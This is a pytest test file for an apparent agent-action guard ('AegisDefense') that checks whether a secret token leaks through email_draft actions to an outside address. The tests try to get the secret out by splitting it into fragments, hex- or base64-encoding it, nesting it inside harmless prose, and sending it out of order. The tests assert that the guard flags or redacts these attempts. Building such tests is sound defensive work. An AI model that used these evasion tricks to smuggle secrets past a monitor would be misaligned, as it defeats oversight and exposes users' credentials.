import base64
import json

import pytest

from aegis.defense import AegisDefense
from tests.test_defense import SECRET, action, request


@pytest.mark.parametrize(
    "encode", [lambda s: s, lambda s: s.encode().hex(), lambda s: base64.b64encode(s.encode()).decode()]
)
def test_fragmented_encoded_secret_cannot_complete(encode):
    d = AegisDefense()
    d.decide(request(action(), content=json.dumps({"token": SECRET})))
    value = encode(SECRET)
    results = []
    for i in range(0, len(value), 4):
        a = action("email_draft", to="someone@outside.example", subject="Fragment", body=value[i : i + 4])
        results.append(d.decide(request(a, step=i + 2)))
    assert any(r.reason_codes[0] in {"CROSS_ACTION_DISCLOSURE", "REORDERED_FRAGMENT_DISCLOSURE"} for r in results)


def test_nested_encoding_redaction_keeps_safe_prose():
    encoded = base64.b64encode(base64.b64encode(SECRET.encode())).decode()
    a = action(
        "email_draft", to="someone@outside.example", subject="Status", body="The shipment arrived safely. " + encoded
    )
    result = AegisDefense().decide(request(a, content=json.dumps({"token": SECRET})))
    assert result.decision == "rewrite"
    assert result.rewritten_action.arguments["body"] == "The shipment arrived safely. [REDACTED]"


def test_retry_does_not_double_count_release():
    d = AegisDefense()
    d.decide(request(action(), content=json.dumps({"token": SECRET})))
    a = action("email_draft", to="someone@outside.example", subject="Fragment", body=SECRET[:8])
    r = request(a, step=2)
    first = d.decide(r)
    second = d.decide(r)
    assert first == second
    assert d.sessions[r.run_id].egress["email:someone@outside.example:body"] == SECRET[:8]


def test_out_of_order_request_does_not_reset_state():
    d = AegisDefense()
    d.decide(request(action(), content=json.dumps({"token": SECRET})))
    d.decide(request(action(), step=8))
    assert d.decide(request(action(), step=3)).reason_codes == ["OUT_OF_ORDER_REQUEST"]


def test_reordered_cross_field_fragments():
    d = AegisDefense()
    d.decide(request(action(), content=json.dumps({"token": SECRET})))
    results = []
    for step, i in enumerate(range(len(SECRET) - 4, -1, -4), 2):
        a = action("email_draft", to="someone@outside.example", subject=f"Fragment {i}", body=SECRET[i : i + 4])
        results.append(d.decide(request(a, step=step)))
    assert any(r.decision != "allow" for r in results)
